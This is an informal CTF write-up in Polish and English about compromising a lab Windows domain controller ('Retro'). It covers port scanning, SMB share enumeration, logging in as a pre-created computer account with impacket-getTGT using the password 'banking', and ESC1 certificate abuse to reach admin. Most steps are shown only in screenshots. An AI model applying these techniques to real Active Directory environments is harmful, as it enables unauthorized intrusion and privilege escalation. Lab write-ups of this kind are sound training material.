#Retro
Windows, Easy, created by **r0BIT**


```
53/tcp    open  domain        Simple DNS Plus
53/udp  open  domain       (generic dns response: SERVFAIL)
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-27 11:09:54Z)
123/udp open  ntp          NTP v3
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC

```

```
10.10.93.230 DC.retro.vl retro.vl
```

![{7F50A555-1CAA-4972-BAA2-0146D8AB3A19}](https://github.com/user-attachments/assets/9e985ad7-e797-4af8-abbd-35fc2781323d)

Interesting

```
enum4linux -a 10.10.93.230
enum4linux -u guest -a 10.10.93.230
enum4linux -u anonymous -a 10.10.93.230
```

some output
```
[+] Attempting to map shares on 10.10.93.230                                                                                                                                                                                                
                                                                                                                                                                                                                                            
//10.10.93.230/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                           
//10.10.93.230/C$       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                                                                                                           
//10.10.93.230/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//10.10.93.230/NETLOGON Mapping: OK Listing: DENIED Writing: N/A
//10.10.93.230/Notes    Mapping: OK Listing: DENIED Writing: N/A
//10.10.93.230/SYSVOL   Mapping: OK Listing: DENIED Writing: N/A
//10.10.93.230/Trainees Mapping: OK Listing: OK Writing: N/A

```

![{E01933E8-D0D6-4F51-9973-FAD4CD178E90}](https://github.com/user-attachments/assets/7025f38b-0800-4bc8-9cd2-960d2e2f3ef2)

![{339F338C-4A5D-448A-9878-A12DD2A99AF2}](https://github.com/user-attachments/assets/f343e62e-fbd6-4c37-9824-5aaf2999aabe)

![{F6EE8389-C344-4405-BB31-98C74FCFDDDE}](https://github.com/user-attachments/assets/1db00d63-ba61-4626-b2b9-12e15b2467f5)

![{114CA756-A357-4117-8EC3-D174FD2156BF}](https://github.com/user-attachments/assets/131a239b-8b87-44a4-aff4-80b0372ff5b4)

![{8205FCC4-2FA7-4F96-A902-ACD047982181}](https://github.com/user-attachments/assets/30fa112b-3271-4e18-bc12-ff20923d7d50)
- dobra nie muszę rockyour puszczać xd
- siedzi dwóch userów

![{49558BE5-E638-4D7A-820E-E976C9CEEDFB}](https://github.com/user-attachments/assets/98d3f594-cfa1-43e6-9668-6008ec931c0d)

![{D76DC5CC-B78C-4A98-BA75-B5732423B3D1}](https://github.com/user-attachments/assets/cc4e3247-c2a4-47b1-ba30-1142389897c1)

chyba mówi o koncie `BANKING$`

Listę zrobiłem i szukamy hasła.
![{B04F4535-8D38-477D-B675-AA08B474BB86}](https://github.com/user-attachments/assets/39d8d344-fb9a-4768-8b11-1437ddd606aa)

![{94DC766B-8911-433D-B604-B42A4DE540BC}](https://github.com/user-attachments/assets/ef495cca-a2b9-4c79-9c6d-655b3f815328)

O tak nie miałem jeszcze

I found some info
https://trustedsec.com/blog/diving-into-pre-created-computer-accounts


```
cat /etc/krb5.conf 
[libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true


[realms]        
        RETRO.VL = {
                kdc = DC.RETRO.VL 
                admin_server = DC.RETRO.VL
                }

```
```
sudo apt-get install krb5-user
```
![{348A729D-9BA8-4358-B63E-B22024C88585}](https://github.com/user-attachments/assets/d13edd47-9581-484d-aab1-f79c3826cb8e)

echo errors again.
But it is typical

```
sudo timedatectl set-ntp off
while true; do sudo rdate -n 10.10.93.230; done
```

![{55C2B68A-5B38-405F-93F0-1FE490D8AE2A}](https://github.com/user-attachments/assets/be3a76e7-8c05-4886-a83a-68040b11766e)

file again. Google time

edit /etc/krb5.conf
```
[libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

        kdc_timesync = 1
        cchace_type = 4
        forwarable = true
        proxiable = true
        rdns = false

        fcc-mit-tricketflags = true

[realms]        
        RETRO.VL = {
                kdc = DC.RETRO.VL 
                admin_server = DC.RETRO.VL          
                }

```

I nie działa.. ech
- zmarnowałem na to jakoś 2 godziny i nie rozumiem czmeu nie działa. Spróbuję czegoś innego.
![{0C5F0E31-9609-47B5-87F5-133E4927E49D}](https://github.com/user-attachments/assets/815fddb4-8aa0-4507-b05c-0cb7eb10d7b8)

![{CD208D5D-76CD-4D41-82F8-1BB48538EFD8}](https://github.com/user-attachments/assets/e23469b4-58a1-4334-b92f-5ec2012161c5)

Coś tam widać.

Following instruction for ESC1

![{92C81B8F-9C5C-413B-846F-0AB22B77424A}](https://github.com/user-attachments/assets/3232048d-3682-48c0-849e-5ddb44d7ad4d)

ech we need this computer account.
Or... we can add our PC.

DOBRA MAMY TO!

![{4C1032F0-D9C4-4E34-8A39-BB037B742989}](https://github.com/user-attachments/assets/33861608-932f-4409-8d39-3d41f54475f4)

```
impacket-getTGT 'retro.vl/BANKING$:banking'
export KRB5CCNAME=BANKING\$.ccache
```

![{F4D279AE-20EB-4C45-AEE2-FCF0EEFD906D}](https://github.com/user-attachments/assets/ddd8e7f3-9984-490c-920b-0d4d7e8fb7b0)

I run it twice and works :D

![{6553B659-F7B0-4BF9-B08E-13C31691846B}](https://github.com/user-attachments/assets/db63ada6-e388-41fb-a8a1-8e4ec8c8ed9c)

and we are admin

![{B37E5543-56F5-4EEC-93E7-C2D24FDFA91B}](https://github.com/user-attachments/assets/12dc5fe7-29c9-4d10-bc75-3cfbd99a66e1)

I had a problem with psexec, atexec, wmiexec, itd. so I run commands with nxc (I know nxc is using  psexec, atexec, wmiexec, smbexec but.. it works)

![{E8F3A10C-E1BE-4C4E-886C-B206DC474527}](https://github.com/user-attachments/assets/2c39f2eb-a6c8-4307-b215-a7b57ee996bc)


